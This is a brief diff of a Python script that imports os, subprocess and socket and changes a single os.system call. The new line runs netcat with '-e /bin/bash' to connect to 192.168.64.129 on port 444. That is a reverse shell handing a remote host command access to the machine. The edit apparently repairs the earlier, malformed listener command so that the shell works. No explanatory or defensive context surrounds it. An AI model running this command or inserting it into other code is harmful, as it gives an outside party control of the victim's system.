@@ -5,4 +5,4 @@ import subprocess
 import sys
 import socket 
 
-os.system("nc -lvnp 192.168.64.129 444 -e /bin/bash ")
+os.system("nc -n 192.168.64.129 444 -e /bin/bash ")
